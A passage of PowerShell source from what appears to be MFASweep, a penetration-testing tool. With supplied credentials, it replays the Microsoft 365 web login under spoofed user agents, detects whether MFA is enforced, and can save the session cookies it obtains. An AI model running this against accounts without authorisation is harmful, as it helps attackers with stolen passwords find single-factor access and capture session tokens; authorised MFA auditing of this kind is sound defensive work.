        $svc    = $_.Service.PadRight($maxSvcLen + 2)
        $proto  = $_.Protocol.PadRight($maxProtoLen + 2)
        $result = $_.Result -replace '\{.*\}', ''
        if ($result -match "^YES") {
            Write-Host -NoNewline "$svc | $proto | "
            Write-Host -ForegroundColor Green $result
        } elseif ($result -eq "AVAILABLE" -or $result -eq "ENABLED") {
            Write-Host -NoNewline "$svc | $proto | "
            Write-Host -ForegroundColor Yellow $result
        } elseif ($result -eq "BLOCKED" -or $result -eq "DISABLED" -or $result -eq "NOT_DETECTED") {
            Write-Host "$svc | $proto | $result" -ForegroundColor Green
        } elseif ($result -eq "N/A") {
            Write-Host "$svc | $proto | $result" -ForegroundColor DarkGray
        } else {
            Write-Host "$svc | $proto | $result"
        }
    }

    # ── HTML report export ────────────────────────────────────────────────────
    if ($OutputPath -ne "") {
        $escapedUsername = [System.Net.WebUtility]::HtmlEncode($Username)
        $htmlRows = $results | ForEach-Object {
            $color = if ($_.Result -match "^YES") { "#c8f7c5" } elseif ($_.Result -eq "AVAILABLE" -or $_.Result -eq "ENABLED") { "#fff3cd" } elseif ($_.Result -eq "BLOCKED" -or $_.Result -eq "DISABLED" -or $_.Result -eq "NOT_DETECTED") { "#c8f7c5" } elseif ($_.Result -eq "N/A") { "#f0f0f0" } else { "#fde8e8" }
            "<tr style='background:$color'><td>$($_.Service)</td><td>$($_.Protocol)</td><td><b>$($_.Result)</b></td></tr>"
        }
        $html = @"
<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>MFASweep Results  - $escapedUsername</title>
<style>
  body { font-family: Segoe UI, Arial, sans-serif; margin: 30px; background: #f9f9f9; }
  h1   { color: #c0392b; }
  table { border-collapse: collapse; width: 100%; max-width: 900px; }
  th, td { border: 1px solid #ccc; padding: 8px 14px; text-align: left; }
  th { background: #2c3e50; color: white; }
  .meta { margin-bottom: 20px; font-size: 0.95em; color: #555; }
</style></head><body>
<h1>MFASweep Results</h1>
<div class='meta'>
  <b>Target:</b> $escapedUsername &nbsp;|&nbsp;
  <b>Date:</b> $($global:SweepStartTime.ToString('yyyy-MM-dd HH:mm:ss')) &nbsp;|&nbsp;
  <b>Duration:</b> $SweepDuration &nbsp;|&nbsp;
  <b>Single-factor access:</b> $SingleFactorCount / $($results.Count)
</div>
<table>
<tr><th>Service / Portal</th><th>Protocol</th><th>Result</th></tr>
$($htmlRows -join "`n")
</table>
</body></html>
"@
        $html | Out-File -FilePath $OutputPath -Encoding utf8 -Force
        Write-Host -ForegroundColor Cyan "`n[*] HTML report saved to: $OutputPath"
    }
}



Function Invoke-M365WebPortalAuth{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UAtype = "Windows",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $UserAgent = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]$WriteTokens,

    [Parameter(Position = 5, Mandatory = $False)]
    [switch]$DebugWebAuth,

    [Parameter(Position = 6, Mandatory = $False)]
    [string]$DebugUserAgent = "iPhone"

    )
   
    $globalVariableMap = @{
    "Windows"     = "o365wresult"
    "Linux"       = "o365lresult"
    "MacOS"       = "o365mresult"
    "Android"     = "o365apresult"
    "iPhone"      = "o365ipresult"
    "WindowsPhone" = "o365wpresult"
    "NintendoSwitch" = "o365upresult"
    }

    Write-Host `r`n
    
    if ($UserAgent -ne ""){
        $UAtype = "Custom User Agent"
    }
    else{
        if ($UAType -eq "Windows"){
            $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.3179.85"
        }
        elseif($UAType -eq "Android"){
            $UserAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        }
        elseif($UAType -eq "iPhone"){
            $UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/605.1.15"
        }
        elseif($UAType -eq "Linux"){
            $UserAgent = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:135.0) Gecko/20100101 Firefox/135.0"
        }
        elseif($UAType -eq "WindowsPhone"){
            $UserAgent = "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"
        }
        elseif($UAType -eq "MacOS"){
            $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:137.0) Gecko/20100101 Firefox/137.0"
        }
        elseif($UAType -eq "NintendoSwitch"){
            $UserAgent = "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343"
        }
        else{
        Write-Host -ForegroundColor Red "[*] Unknown User Agent Type. Try: Windows, Android, iPhone, Linux, WindowsPhone, MacOS, or NintendoSwitch"
        break
        }
    }
    Write-Host "---------------- Microsoft 365 Web Portal w/ ($UAtype) User Agent ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Microsoft 365 Web Portal using a ($UAtype) user agent..."
    $UAtypeName = [string]$UAtype
    $EnableDebugCapture = $DebugWebAuth -and ($UAtypeName -eq $DebugUserAgent -or ($UserAgent -ne "" -and $DebugUserAgent -eq "Custom User Agent"))
    $BootstrapUrl = "https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&response_type=code&redirect_uri=https%3A%2F%2Foutlook.office365.com%2Fowa%2F&resource=https%3A%2F%2Foutlook.office365.com&response_mode=form_post"
    $o365 = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    $SessionRequest = Get-M365BootstrapPage -BootstrapUrl $BootstrapUrl -WebSession $o365 -UserAgent $UserAgent -EnableDebugCapture:$EnableDebugCapture -DebugUserAgentType $UAtypeName -Username $Username -Password $Password
    if (-not $SessionRequest) {
        return
    }

    $BootstrapData = Get-M365WebPortalBootstrapData -Content $SessionRequest.Content
    $ctx = $BootstrapData.Ctx
    $FlowToken = $BootstrapData.FlowToken
    $Canary = $BootstrapData.Canary

    if (-not $BootstrapData.Success) {
        Write-Host -ForegroundColor Yellow "[*] The Microsoft 365 login page loaded, but the expected bootstrap tokens were not found."
        if ($BootstrapData.MissingFields) {
            Write-Host -ForegroundColor DarkYellow "[**] Missing fields: $($BootstrapData.MissingFields -join ', ')"
        }
        Write-Host -ForegroundColor DarkYellow "[**] Login check for this user agent was skipped to avoid a false result."
        return
    }

# Output the extracted values for verification
#Write-Output "CTX: $ctx"
#Write-Output "FlowToken: $FlowToken"
#Write-Output "Canary: $Canary"

    $Userform = @{
        username = "$username";
        isOtherIdpSupported = "false";
        checkPhones = "false";
        isRemoteNGCSupported = "true";
        isCookieBannerShown = "false";
        isFidoSupported = "true";
        originalRequest = "$ctx";
        country = "US"; 
        forceotclogin = "false";
        isExternalFederationDisallowed = "false";
        isRemoteConnectSupported = "false";
        federationFlags = "0";
        isSignup = "false";
        flowToken = "$FlowToken";
        isAccessPassSupported = "true"

    }
    $JSONForm = $Userform | ConvertTo-Json

    $UserNameRequest = Invoke-MFASweepWebRequest -Uri ("https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US") -WebSession $o365 -Method POST -Body $JSONForm -UserAgent "$UserAgent"
    if ($EnableDebugCapture) {
        Write-DebugWebAuthCapture -UAtype $UAtypeName -Stage "credential-type" -Content $UserNameRequest.Content -Username $Username -Password $Password
    }


    $AuthBody = @{i13='0';
    login=$username;
    loginfmt=$username;
    type='11';
    LoginOptions='3';
    lrt='';
    lrtPartition='';
    hisRegion='';
    hisScaleUnit='';
    passwd=$password;
    ps='2';
    psRNGCDefaultType='';
    psRNGCEntropy='';
    psRNGCSLK='';
    canary=$Canary;
    ctx=$ctx;
    hpgrequestid='';
    flowToken=$FlowToken;
    NewUser='1';
    FoundMSAs='';
    fspost='0';
    i21='0';
    CookieDisclosure='0';
    IsFidoSupported='1';
    isSignupPost='0';
    i2='1';
    i17='';
    i18='';
    i19='198733';
    }

    $AuthRequest = Invoke-MFASweepWebRequest -Uri ("https://login.microsoftonline.com/common/login") -WebSession $o365 -Method POST -Body $AuthBody -UserAgent "$UserAgent"
    if ($EnableDebugCapture) {
        Write-DebugWebAuthCapture -UAtype $UAtypeName -Stage "post-login" -Content $AuthRequest.Content -Username $Username -Password $Password
        Write-DebugWebAuthCookieCapture -UAtype $UAtypeName -Stage "post-login-cookies" -CookieContainer $o365.Cookies
    }

    $InterruptResult = Resolve-M365WebPortalInterrupt -AuthRequest $AuthRequest -WebSession $o365 -UserAgent $UserAgent -UAtype $UAtypeName -EnableDebugCapture:$EnableDebugCapture -Username $Username -Password $Password
    if ($InterruptResult.Response) {
        $AuthRequest = $InterruptResult.Response
    }

    $AuthResult = Get-M365WebPortalAuthState -Content $AuthRequest.Content
    if ($AuthResult.State -eq "AuthenticatedUnknown" -and $InterruptResult.State -eq "AppVerifyUserContextMissing") {
        $AuthResult = [pscustomobject]@{
            State = "AuthenticatedUnknown"
            Reason = "Post-password KMSI flow reached; synthetic appverify replay failed because Microsoft required browser-only user-context tokens"
        }
    }
    $HasEstsAuthCookie = $o365.Cookies.GetCookies("https://login.microsoftonline.com").Name -like "ESTSAUTH"
    # Check for either the ESTSAUTH cookie or a recognized post-authentication page
    if ($AuthResult.State -eq "MFARequired") {
        Write-Host -ForegroundColor Green "[*] Primary authentication to the Microsoft 365 Web Portal succeeded."
        Write-Host -ForegroundColor Red "[**] MFA is enabled and was required for this account."

        if ($WriteTokens) {
            Write-CookiesToFile -Cookies $o365.Cookies.GetCookies("https://login.microsoftonline.com") -UserAgent $UserAgent
        }

        # Optionally, you can extract the specific MFA method used (authMethodId)
        $authMethodId = $AuthRequest.Content -match '"authMethodId":"([^"]+)"' | Out-Null
        $mfaMethod = $matches[1]
        if ($mfaMethod) {
            Write-Host -ForegroundColor DarkYellow "[***] MFA Method Used: $mfaMethod"
        }
        elseif ($AuthResult.Reason) {
            Write-Host -ForegroundColor DarkYellow "[***] MFA Detection Clue: $($AuthResult.Reason)"
        }
    
        foreach ($cookie in $o365.Cookies.GetCookies("https://login.microsoftonline.com")) {
            Write-Verbose ($cookie.name + " = " + $cookie.value)
        }
    } elseif ($AuthResult.State -eq "SingleFactorSuccess") {
        Write-Host -ForegroundColor Green "[*] Primary authentication to the Microsoft 365 Web Portal succeeded."
        if ($WriteTokens) {
            Write-CookiesToFile -Cookies $o365.Cookies.GetCookies("https://login.microsoftonline.com") -UserAgent $UserAgent
        }

        # MFA was not required during this login session
        Write-Host -ForegroundColor Cyan "[**] It appears there is no MFA required for this account."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Login with a web browser to https://outlook.office365.com using a user agent that matches $UAtype. Ex: $UserAgent"

        # Mark result for future use
        $uaorig = $UAtypeName
        if ($globalVariableMap.ContainsKey($uaorig)) {
            $globalVariableName = $globalVariableMap[$uaorig]
            $globalVariableValue = "YES"
    
            # Dynamically setting the global variable in the global scope
            Set-Variable -Name $globalVariableName -Value $globalVariableValue -Scope Global
        } else {
            Write-Host -ForegroundColor Yellow "[**] Using a custom User Agent. No global variable was updated."
        }

        foreach ($cookie in $o365.Cookies.GetCookies("https://login.microsoftonline.com")) {
            Write-Verbose ($cookie.name + " = " + $cookie.value)
        }
    } elseif ($AuthResult.State -eq "AuthenticatedUnknown" -or $HasEstsAuthCookie) {
        Write-Host -ForegroundColor Green "[*] Primary authentication to the Microsoft 365 Web Portal succeeded."
        if ($WriteTokens) {
            Write-CookiesToFile -Cookies $o365.Cookies.GetCookies("https://login.microsoftonline.com") -UserAgent $UserAgent
        }
        if ($AuthResult.Reason -match "browser-only user-context tokens") {
            Write-Host -ForegroundColor Yellow "[**] Authentication succeeded, but Microsoft required additional browser-only context during the post-login flow."
            Write-Host -ForegroundColor DarkYellow "[***] Detection Clue: $($AuthResult.Reason)"
            Write-Host -ForegroundColor DarkYellow "[***] This usually means the username/password step succeeded, but the web flow could not be fully replayed outside a real browser session."
            Write-Host -ForegroundColor DarkYellow "[***] Result not marked as single-factor access to avoid false positives."
        }
        else {
            Write-Host -ForegroundColor Yellow "[**] Authentication succeeded, but the post-login flow could not be confidently classified as single-factor or MFA."
            if ($AuthResult.Reason) {
                Write-Host -ForegroundColor DarkYellow "[***] Detection Clue: $($AuthResult.Reason)"
            }
            Write-Host -ForegroundColor DarkYellow "[***] Result not marked as single-factor access to avoid false positives."
        }
    } else {
        Write-Host -ForegroundColor Red "[*] Login appears to have failed."
    }
}

Function Get-M365WebPortalAuthState{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Content = ""

    )

    $result = [pscustomobject]@{
        State = "UnknownPostAuthState"
        Reason = ""
    }

    if ([string]::IsNullOrEmpty($Content)) {
        $result.Reason = "Empty response content"
        return $result
    }

    # Microsoft sometimes returns an auto-submitting handoff page instead of the
    # older MFA prompts. Treat these redirect pages as MFA-required rather than
    # falling through to a false single-factor success result.
    $hiddenFormSignals = @(
        'device\.login\.microsoftonline\.com',
        'name="hiddenform"',
        'document\.forms\[0\]\.submit\(\)',
        'name="request"',
        'name="flowToken"',
        'name="canary"'
    )

    foreach ($signal in $hiddenFormSignals) {
        if ($Content -match $signal) {
            $result.State = "MFARequired"
            $result.Reason = "Hidden-form redirect / MFA handoff page detected"
            return $result
        }
    }

    if ($Content -match "authMethodId") {
        $result.State = "MFARequired"
        $result.Reason = "authMethodId marker detected"
        return $result
    }

    if ($Content -match "Verify your identity") {
        $result.State = "MFARequired"
        $result.Reason = "Verify your identity prompt detected"
        return $result
    }

    if ($Content -match "Stay signed in") {
        $result.State = "SingleFactorSuccess"
        $result.Reason = "Stay signed in prompt detected"
        return $result
    }

    if ($Content -match 'PageID"\s+content="KmsiInterrupt"' -or $Content -match '"pgid":"KmsiInterrupt"' -or $Content -match '"urlPost":"/kmsi"') {
        $result.State = "SingleFactorSuccess"
        $result.Reason = "KMSI prompt detected"
        return $result
    }

    if ($Content -match 'PageID"\s+content="CmsiInterrupt"' -or $Content -match '"pgid":"CmsiInterrupt"' -or $Content -match '"urlPost":"/appverify"') {
        $result.State = "AuthenticatedUnknown"
        $result.Reason = "KMSI / CmsiInterrupt page detected"
        return $result
    }

    if ($Content -match "ProofUp" -or $Content -match "Additional verification" -or $Content -match "More information required") {
        $result.State = "MFARequired"
        $result.Reason = "Additional verification flow detected"
        return $result
    }

    $result.Reason = "No known post-login markers matched"
    return $result
}

Function Get-FirstRegexCapture{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Content = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string[]]
    $Patterns

    )

    foreach ($pattern in $Patterns) {
        $match = [regex]::Match($Content, $pattern)
        if ($match.Success -and $match.Groups.Count -gt 1) {
            return Convert-JsonStringLiteralValue -Value $match.Groups[1].Value
        }
    }

    return ""
}

Function Convert-JsonStringLiteralValue{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Value = ""

    )

    if ([string]::IsNullOrEmpty($Value)) {
        return $Value
    }

    try {
        $jsonString = '"' + ($Value.Replace('\', '\\').Replace('"', '\"')) + '"'
        return $jsonString | ConvertFrom-Json
    }
    catch {
        try {
            return [regex]::Unescape($Value)
        }
        catch {
            return $Value
        }
    }
}

Function Convert-M365EscapedUrlValue{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Value = ""

    )

    if ([string]::IsNullOrEmpty($Value)) {
        return $Value
    }

    $normalized = $Value

    for ($i = 0; $i -lt 3; $i++) {
        try {
            $decoded = [System.Uri]::UnescapeDataString($normalized)
        }
        catch {
            break
        }

        if ($decoded -eq $normalized) {
            break
        }

        $normalized = $decoded
    }

    $normalized = Convert-JsonStringLiteralValue -Value $normalized

    return $normalized
}

Function Get-M365WebPortalBootstrapData{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Content = ""

    )

    $ctx = Get-FirstRegexCapture -Content $Content -Patterns @(
        '"sCtx":"([^"]+)"',
        '"originalRequest":"([^"]+)"',
        'ctx=([^"&]+)',
        'name="ctx"\s+value="([^"]+)"',
        'name="originalRequest"\s+value="([^"]+)"'
    )

    $flowToken = Get-FirstRegexCapture -Content $Content -Patterns @(
        '"sFT":"([^"]+)"',
        '"flowToken":"([^"]+)"',
        'name="flowToken"\s+value="([^"]+)"',
        'name="sFT"\s+value="([^"]+)"'
    )

    $canary = Get-FirstRegexCapture -Content $Content -Patterns @(
        '"apiCanary":"([^"]+)"',
        '"canary":"([^"]+)"',
        'name="canary"\s+value="([^"]+)"',
        'name="apiCanary"\s+value="([^"]+)"'
    )

    $missingFields = @()
    if (-not $ctx) { $missingFields += "ctx" }
    if (-not $flowToken) { $missingFields += "flowToken" }
    if (-not $canary) { $missingFields += "canary" }

    return [pscustomobject]@{
        Success = ($missingFields.Count -eq 0)
        Ctx = $ctx
        FlowToken = $flowToken
        Canary = $canary
        MissingFields = $missingFields
    }
}

Function Get-HttpStatusCodeFromErrorRecord{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [System.Management.Automation.ErrorRecord]
    $ErrorRecord

    )

    if ($ErrorRecord.Exception.Response -and $ErrorRecord.Exception.Response.StatusCode) {
        try {
            return [int]$ErrorRecord.Exception.Response.StatusCode
        }
        catch {
            try {
                return $ErrorRecord.Exception.Response.StatusCode.Value__
            }
            catch {
            }
        }
    }

    if ($ErrorRecord.Exception.StatusCode) {
        try {
            return [int]$ErrorRecord.Exception.StatusCode
        }
        catch {
        }
    }

    return $null
}

Function Get-M365InterruptConfig{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Content = ""

    )

    $urlPost = Get-FirstRegexCapture -Content $Content -Patterns @(
        '"urlPost":"([^"]+)"'
    )

    $urlPost = Convert-M365EscapedUrlValue -Value $urlPost

    if (-not $urlPost) {
        return [pscustomobject]@{
            State = "None"
            Response = $null
        }
    }

    return [pscustomobject]@{
        UrlPost = $urlPost
        FlowToken = Get-FirstRegexCapture -Content $Content -Patterns @('"sFT":"([^"]+)"', '"flowToken":"([^"]+)"')
        Ctx = Get-FirstRegexCapture -Content $Content -Patterns @('"sCtx":"([^"]+)"', '"ctx":"([^"]+)"')
        Canary = Get-FirstRegexCapture -Content $Content -Patterns @('"canary":"([^"]+)"')
        ApiCanary = Get-FirstRegexCapture -Content $Content -Patterns @('"apiCanary":"([^"]+)"')
        CorrelationId = Get-FirstRegexCapture -Content $Content -Patterns @('"correlationId":"([^"]+)"')
        SessionId = Get-FirstRegexCapture -Content $Content -Patterns @('"sessionId":"([^"]+)"')
        PostUsername = Get-FirstRegexCapture -Content $Content -Patterns @('"sPOST_Username":"([^"]+)"')
        HpgId = Get-FirstRegexCapture -Content $Content -Patterns @('"hpgid":([0-9]+)')
        HpgAct = Get-FirstRegexCapture -Content $Content -Patterns @('"hpgact":([0-9]+)')
        PageId = Get-FirstRegexCapture -Content $Content -Patterns @('"pgid":"([^"]+)"', 'PageID"\s+content="([^"]+)"')
    }
}

Function Get-WebSessionCookieValue{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    $CookieContainer,

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Uri,

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $Name

    )

    try {
        foreach ($cookie in $CookieContainer.GetCookies($Uri)) {
            if ($cookie.Name -eq $Name) {
                return $cookie.Value
            }
        }
    }
    catch {
    }

    return ""
}

Function Resolve-M365WebPortalInterrupt{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    $AuthRequest,

    [Parameter(Position = 1, Mandatory = $True)]
    $WebSession,

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $UserAgent,

    [Parameter(Position = 3, Mandatory = $True)]
    [string]
    $UAtype,

    [Parameter(Position = 4, Mandatory = $True)]
    [bool]
    $EnableDebugCapture,

    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Username = "",

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Password = ""

    )

    $InterruptConfig = Get-M365InterruptConfig -Content $AuthRequest.Content
    if (-not $InterruptConfig -or $InterruptConfig.UrlPost -ne "/appverify") {
        return $null
    }

    $sessionContextToken = Get-WebSessionCookieValue -CookieContainer $WebSession.Cookies -Uri 'https://login.microsoftonline.com' -Name 'esctx'
    $interruptRequestId = if ($InterruptConfig.SessionId) { $InterruptConfig.SessionId } else { $InterruptConfig.CorrelationId }

    $InterruptBody = @{
        LoginOptions = '1'
        type = '28'
        ctx = $InterruptConfig.Ctx
        hpgrequestid = $interruptRequestId
        flowToken = $InterruptConfig.FlowToken
        canary = $InterruptConfig.Canary
        i17 = ''
        i18 = ''
        i19 = '0'
    }
    if ($sessionContextToken) {
        $InterruptBody.token = $sessionContextToken
    }
    if ($InterruptConfig.PostUsername) {
        $InterruptBody.login = $InterruptConfig.PostUsername
        $InterruptBody.loginfmt = $InterruptConfig.PostUsername
    }

    $InterruptHeaders = @{
        'canary' = if ($InterruptConfig.ApiCanary) { $InterruptConfig.ApiCanary } else { $InterruptConfig.Canary }
        'client-request-id' = $InterruptConfig.CorrelationId
        'hpgid' = $InterruptConfig.HpgId
        'hpgact' = $InterruptConfig.HpgAct
        'Referer' = 'https://login.microsoftonline.com/'
        'Origin' = 'https://login.microsoftonline.com'
    }

    try {
        $InterruptResponse = Invoke-MFASweepWebRequest -Uri ("https://login.microsoftonline.com" + $InterruptConfig.UrlPost) -WebSession $WebSession -Method POST -Body $InterruptBody -Headers $InterruptHeaders -UserAgent "$UserAgent" -ErrorAction Stop
        if ($EnableDebugCapture) {
            Write-DebugWebAuthCapture -UAtype $UAtype -Stage "post-appverify" -Content $InterruptResponse.Content -Username $Username -Password $Password
            Write-DebugWebAuthCookieCapture -UAtype $UAtype -Stage "post-appverify-cookies" -CookieContainer $WebSession.Cookies
        }

        if ($InterruptResponse.Content -match "AADSTS165000") {
            return [pscustomobject]@{
                State = "AppVerifyUserContextMissing"
                Response = $null
            }
        }

        return [pscustomobject]@{
            State = "Resolved"
            Response = $InterruptResponse
        }
    }
    catch {
        $errorContent = ""
        if ($EnableDebugCapture -and $_.ErrorDetails.Message) {
            $errorContent = $_.ErrorDetails.Message
            Write-DebugWebAuthCapture -UAtype $UAtype -Stage "post-appverify-error" -Content $errorContent -Username $Username -Password $Password
        }
        if (-not $errorContent -and $_.Exception.Message) {
            $errorContent = $_.Exception.Message
        }

        if ($errorContent -match "AADSTS165000") {
            return [pscustomobject]@{
                State = "AppVerifyUserContextMissing"
                Response = $null
            }
        }
        return [pscustomobject]@{
            State = "Error"
            Response = $null
        }
    }
}

Function Get-ResponseHeaderValue{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    $Headers,

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Name

    )

    if (-not $Headers) {
        return $null
    }

    try {
        return $Headers[$Name]
    }
    catch {
        try {
            return $Headers.GetValues($Name)
        }
        catch {
            return $null
        }
    }
}

Function Get-M365BootstrapPage{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $BootstrapUrl,

    [Parameter(Position = 1, Mandatory = $True)]
    $WebSession,

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $UserAgent,

    [Parameter(Position = 3, Mandatory = $True)]
    [bool]
    $EnableDebugCapture,

    [Parameter(Position = 4, Mandatory = $True)]
    [string]
    $DebugUserAgentType,

    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Username = "",

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Password = ""

    )

    try {
        $BootstrapRequest = Invoke-MFASweepWebRequest -Uri $BootstrapUrl -WebSession $WebSession -UserAgent "$UserAgent" -ErrorAction Stop
        if ($EnableDebugCapture) {
            Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap" -Content $BootstrapRequest.Content -Username $Username -Password $Password
        }

        $BootstrapInterrupt = Get-M365InterruptConfig -Content $BootstrapRequest.Content
        if ($BootstrapInterrupt.PageId -eq "BssoInterrupt" -and $BootstrapInterrupt.UrlPost) {
            $BootstrapInterruptUrl = $BootstrapInterrupt.UrlPost
            if ($BootstrapInterruptUrl.StartsWith("/")) {
                $BootstrapInterruptUrl = "https://login.microsoftonline.com$BootstrapInterruptUrl"
            }

            $BootstrapInterruptHeaders = @{
                'canary' = $BootstrapInterrupt.Canary
                'client-request-id' = $BootstrapInterrupt.CorrelationId
                'hpgid' = $BootstrapInterrupt.HpgId
                'hpgact' = $BootstrapInterrupt.HpgAct
                'Referer' = 'https://login.microsoftonline.com/'
                'Origin' = 'https://login.microsoftonline.com'
            }

            try {
                $BootstrapFollowup = Invoke-MFASweepWebRequest -Uri $BootstrapInterruptUrl -WebSession $WebSession -UserAgent "$UserAgent" -Headers $BootstrapInterruptHeaders -ErrorAction Stop
                if ($EnableDebugCapture) {
                    Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap-bsso-followup" -Content $BootstrapFollowup.Content -Username $Username -Password $Password
                }
                return $BootstrapFollowup
            }
            catch {
                if ($EnableDebugCapture -and $_.ErrorDetails.Message) {
                    Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap-bsso-error" -Content $_.ErrorDetails.Message -Username $Username -Password $Password
                }
            }
        }

        return $BootstrapRequest
    }
    catch {
        $StatusCode = Get-HttpStatusCodeFromErrorRecord -ErrorRecord $_

        if ($StatusCode -ge 300 -and $StatusCode -lt 400) {
            $LocationHeader = Get-ResponseHeaderValue -Headers $_.Exception.Response.Headers -Name "Location"
            if ($EnableDebugCapture) {
                $redirectDebug = "HTTP status: $StatusCode`nLocation: $LocationHeader"
                Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap-redirect" -Content $redirectDebug -Username $Username -Password $Password
            }

            if ($LocationHeader) {
                try {
                    $redirectTarget = [string]($LocationHeader | Select-Object -First 1)
                    if ($redirectTarget.StartsWith("/")) {
                        $redirectTarget = "https://login.microsoftonline.com$redirectTarget"
                    }

                    $RedirectRequest = Invoke-MFASweepWebRequest -Uri $redirectTarget -WebSession $WebSession -UserAgent "$UserAgent" -ErrorAction Stop
                    if ($EnableDebugCapture) {
                        Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap" -Content $RedirectRequest.Content -Username $Username -Password $Password
                    }
                    return $RedirectRequest
                }
                catch {
                    if ($EnableDebugCapture -and $_.ErrorDetails.Message) {
                        Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap-error" -Content $_.ErrorDetails.Message -Username $Username -Password $Password
                    }
                }
            }
        }
        elseif ($EnableDebugCapture -and $_.ErrorDetails.Message) {
            Write-DebugWebAuthCapture -UAtype $DebugUserAgentType -Stage "bootstrap-error" -Content $_.ErrorDetails.Message -Username $Username -Password $Password
        }

        if ($StatusCode) {
            Write-Host -ForegroundColor Red "[*] Failed to load the Microsoft 365 web login bootstrap page. HTTP status: $StatusCode"
        }
        else {
            Write-Host -ForegroundColor Red "[*] Failed to load the Microsoft 365 web login bootstrap page."
        }

        return $null
    }
}

Function Sanitize-WebAuthContent{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Content = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $Username = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Password = ""

    )

    $sanitized = $Content

    if ($Username) {
        $sanitized = $sanitized.Replace($Username, '<REDACTED_USERNAME>')
    }

    if ($Password) {
        $sanitized = $sanitized.Replace($Password, '<REDACTED_PASSWORD>')
    }

    $patterns = @(
        '(?i)("passwd"\s*:\s*")[^"]*(")',
        "(?i)('passwd'\s*:\s*')[^']*(')",
        '(?i)(passwd=)[^&"\s<]+',
        '(?i)("flowToken"\s*:\s*")[^"]*(")',
        '(?i)("sFT"\s*:\s*")[^"]*(")',
        '(?i)(flowToken=)[^&"\s<]+',
        '(?i)("canary"\s*:\s*")[^"]*(")',
        '(?i)("apiCanary"\s*:\s*")[^"]*(")',
        '(?i)(canary=)[^&"\s<]+',
        '(?i)("ctx"\s*:\s*")[^"]*(")',
        '(?i)("sCtx"\s*:\s*")[^"]*(")',
        '(?i)("originalRequest"\s*:\s*")[^"]*(")',
        '(?i)(ctx=)[^&"\s<]+',
        '(?i)(ESTSAUTH=)[^;"\s<]+',
        '(?i)(ESTSAUTHPERSISTENT=)[^;"\s<]+',
        '(?i)(x-ms-request-id["'':=\s]+)[A-Za-z0-9\-]+'
    )

    foreach ($pattern in $patterns) {
        $sanitized = [regex]::Replace($sanitized, $pattern, '$1<REDACTED>$2')
    }

    return $sanitized
}

Function Write-DebugWebAuthCapture{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $UAtype = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Stage = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $Content = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Username = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Password = ""

    )

    $safeUa = ($UAtype -replace '[^A-Za-z0-9_-]', '_')
    $safeStage = ($Stage -replace '[^A-Za-z0-9_-]', '_')
    $fileName = "WebAuthDebug-$safeUa-$safeStage.txt"
    $sanitizedContent = Sanitize-WebAuthContent -Content $Content -Username $Username -Password $Password

